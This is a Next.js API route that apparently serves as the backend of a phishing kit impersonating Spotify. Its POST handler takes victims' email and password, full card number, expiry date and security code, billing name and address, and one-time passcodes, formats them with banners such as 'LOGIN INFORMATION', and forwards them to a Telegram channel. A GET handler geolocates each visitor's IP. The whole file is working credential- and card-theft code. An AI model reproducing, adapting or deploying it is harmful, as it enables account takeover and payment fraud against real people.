import { NextRequest, NextResponse } from 'next/server';
import { sendTelegramNotification } from '@/lib/telegram';

// Helper function to get client IP from various headers
function getClientIP(req: NextRequest): string {
  // Try multiple headers in order of preference
  const forwarded = req.headers.get('x-forwarded-for');
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  
  const realIp = req.headers.get('x-real-ip');
  if (realIp) {
    return realIp;
  }
  
  const clientIp = req.headers.get('cf-connecting-ip'); // Cloudflare
  if (clientIp) {
    return clientIp;
  }

  // Fallback to socket address
  const socket = req.socket?.remoteAddress;
  if (socket) {
    return socket;
  }

  return 'Unknown';
}

// Helper function to get visitor info based on client IP
async function getVisitorInfo(ip: string) {
  try {
    if (ip === 'Unknown' || ip === '127.0.0.1' || ip === 'localhost' || ip === '::1') {
      return {
        ip: ip,
        country_name: 'Local',
        city: 'Local',
        region: 'Local',
      };
    }

    // Try ipapi.co first
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`, {
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      
      if (response.ok) {
        const data = await response.json();
        return {
          ip: data.ip || ip,
          country_name: data.country_name || data.country || 'Unknown',
          city: data.city || 'Unknown',
          region: data.region || 'Unknown',
        };
      }
    } catch (e) {
      console.log('ipapi.co failed, trying alternative...');
    }

    // Fallback to ip-api.com
    try {
      const response = await fetch(`http://ip-api.com/json/${ip}`);
      if (response.ok) {
        const data = await response.json();
        if (data.status === 'success') {
          return {
            ip: data.query || ip,
            country_name: data.country || 'Unknown',
            city: data.city || 'Unknown',
            region: data.regionName || 'Unknown',
          };
        }
      }
    } catch (e) {
      console.log('ip-api.com failed');
    }
  } catch (error) {
    console.error('Error getting visitor info:', error);
  }
  
  return {
    ip: ip,
    country_name: 'Unknown',
    city: 'Unknown',
    region: 'Unknown',
  };
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { type, data } = body;

    let message = '';

    if (type === 'newVisitor' && data.visitorInfo) {
      message = `
🎵 <b>NEW SPOTIFY VISITOR</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 Country: <code>${data.visitorInfo.country}</code>
🏙️ City: <code>${data.visitorInfo.city}</code>
📍 Region: <code>${data.visitorInfo.region}</code>
🖥️ IP Address: <code>${data.visitorInfo.ip}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    } else if (type === 'login' && data.email && data.password && data.visitorInfo) {
      message = `
🔐 <b>LOGIN INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email: <code>${data.email}</code>
🔑 Password: <code>${data.password}</code>
🌍 Country: <code>${data.visitorInfo.country}</code>
🖥️ IP Address: <code>${data.visitorInfo.ip}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    } else if (type === 'payment' && data.cardData && data.visitorInfo) {
      message = `
💳 <b>PAYMENT & BILLING INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Card Details:</b>
💳 Card Number: <code>${data.cardData.cardNumber}</code>
📅 Expiration: <code>${data.cardData.expirationDate}</code>
🔐 Security Code: <code>${data.cardData.securityCode}</code>

<b>Billing Information:</b>
👤 Full Name: <code>${data.cardData.fullName}</code>
📍 Address: <code>${data.cardData.address}</code>
🏙️ City: <code>${data.cardData.city}</code>
📮 Postal Code: <code>${data.cardData.postalCode}</code>
🌍 Country: <code>${data.cardData.country}</code>

🖥️ IP Address: <code>${data.visitorInfo.ip}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    } else if (type === 'otp' && data.otp && data.visitorInfo) {
      const status = data.isCorrect ? "✅ CORRECT" : "❌ INCORRECT";
      message = `
🔑 <b>OTP ATTEMPT - ${status}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 OTP Code: <code>${data.otp}</code>
🖥️ IP Address: <code>${data.visitorInfo.ip}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    }

    if (message) {
      await sendTelegramNotification(message, data.visitorInfo?.ip);
      return NextResponse.json({ success: true });
    }

    return NextResponse.json({ error: 'Invalid request type' }, { status: 400 });
  } catch (error) {
    console.error('Notification API error:', error);
    return NextResponse.json({ error: 'Failed to send notification' }, { status: 500 });
  }
}

export async function GET(request: NextRequest) {
  try {
    const clientIP = getClientIP(request);
    const visitorInfo = await getVisitorInfo(clientIP);
    return NextResponse.json(visitorInfo);
  } catch (error) {
    console.error('Error getting visitor info:', error);
    return NextResponse.json({ error: 'Failed to get visitor info' }, { status: 500 });
  }
}
